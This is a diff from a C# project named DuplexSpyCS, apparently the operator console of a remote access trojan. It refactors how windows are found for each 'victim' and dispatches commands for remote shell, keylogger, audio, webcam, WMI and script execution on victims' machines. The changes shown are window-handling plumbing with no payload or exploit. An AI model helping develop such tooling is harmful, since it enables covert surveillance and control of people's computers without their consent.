@@ -749,7 +749,7 @@ namespace DuplexSpyCS
                             case 1:
                                 MessageBox.Show($"Delete {(bKey ? "key" : "value")} successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
-                                frmManager f_mgr = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
+                                frmManager f_mgr = clsTools.fnFindForm<frmManager>(v);
                                 if (f_mgr == null)
                                     return;
 
@@ -925,7 +925,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "system")
                 {
-                    frmSystem f = (frmSystem)clsTools.GetFormByVictim(v, Function.System);
+                    frmSystem f = clsTools.fnFindForm<frmSystem>(v);
                     if (f == null)
                         return;
 
@@ -1001,7 +1001,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "shell")
                 {
-                    frmShell f = (frmShell)clsTools.GetFormByVictim(v, Function.Shell);
+                    frmShell f = clsTools.fnFindForm<frmShell>(v);
                     if (f == null)
                         return;
 
@@ -1022,7 +1022,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "wmi")
                 {
-                    frmWMI f = (frmWMI)clsTools.GetFormByVictim(v, Function.WMI);
+                    frmWMI f = clsTools.fnFindForm<frmWMI>(v);
                     if (f == null)
                         return;
 
@@ -1095,7 +1095,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "keylogger")
                 {
-                    frmKeyLogger f = (frmKeyLogger)clsTools.GetFormByVictim(v, Function.KeyLogger);
+                    frmKeyLogger f = clsTools.fnFindForm<frmKeyLogger>(v);
                     if (f == null)
                         return;
 
@@ -1118,7 +1118,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "chat")
                 {
-                    frmChat f = (frmChat)clsTools.GetFormByVictim(v, Function.Chat);
+                    frmChat f = clsTools.fnFindForm<frmChat>(v);
                     if (f == null)
                         return;
 
@@ -1145,7 +1145,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "audio")
                 {
-                    frmAudio f = (frmAudio)clsTools.GetFormByVictim(v, Function.Audio);
+                    frmAudio f = clsTools.fnFindForm<frmAudio>(v);
                     if (f == null)
                         return;
 
@@ -1254,7 +1254,7 @@ namespace DuplexSpyCS
                 {
                     if (new string[] { "bat", "cs", "vb" }.Contains(cmd[1]))
                     {
-                        frmRunScript f = (frmRunScript)clsTools.GetFormByVictim(v, Function.RunScript);
+                        frmRunScript f = clsTools.fnFindForm<frmRunScript>(v);
                         if (f == null)
                             return;
 
@@ -1283,7 +1283,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "fun")
                 {
-                    frmFunStuff f = (frmFunStuff)clsTools.GetFormByVictim(v, Function.FunStuff);
+                    frmFunStuff f = clsTools.fnFindForm<frmFunStuff>(v);
                     if (f == null)
                         return;
                     if (cmd[1] == "screen")
@@ -1709,13 +1709,11 @@ namespace DuplexSpyCS
                 if (item.SubItems[9].Text != "0")
                 {
                     clsVictim v = GetVictim(item);
-                    frmWebcam f = new frmWebcam(v);
+                    frmWebcam f = clsTools.fnFindForm<frmWebcam>(v);
                     if (f == null)
                     {
                         f = new frmWebcam(v);
                         f.Text = $@"Webcam\\{v.ID}";
-                        f.v = v;
-                        f.Text = @$"{item.SubItems[1].Text}\\Webcam";
 
                         f.Show();
                     }
@@ -1726,7 +1724,7 @@ namespace DuplexSpyCS
                 }
                 else
                 {
-                    MessageBox.Show($"{item.SubItems[1].Text}: Webcam not found!");
+                    MessageBox.Show($"{item.SubItems[1].Text}: Webcam not found!", "Nothing", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
             }
         }
@@ -1941,13 +1939,20 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                frmShell f = new frmShell();
-                f.Tag = Function.Shell;
-                f.v = GetVictim(item);
-                f.Text = @$"Shell\\{f.v.ID}";
-                f.StartPosition = FormStartPosition.CenterScreen;
+                clsVictim victim = GetVictim(item);
+                frmShell f = clsTools.fnFindForm<frmShell>(victim);
+                if (f == null)
+                {
+                    f = new frmShell(victim, ".");
+                    f.Text = @$"Shell\\{f.v.ID}";
+                    f.StartPosition = FormStartPosition.CenterScreen;
 
-                f.Show();
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
 
@@ -2120,7 +2125,6 @@ namespace DuplexSpyCS
                 if (f == null)
                 {
                     f = new frmRunScript(victim);
-                    f.v = GetVictim(item);
                     f.Text = $@"RunScript\\{victim.ID}";
                     f.StartPosition = FormStartPosition.CenterScreen;
 
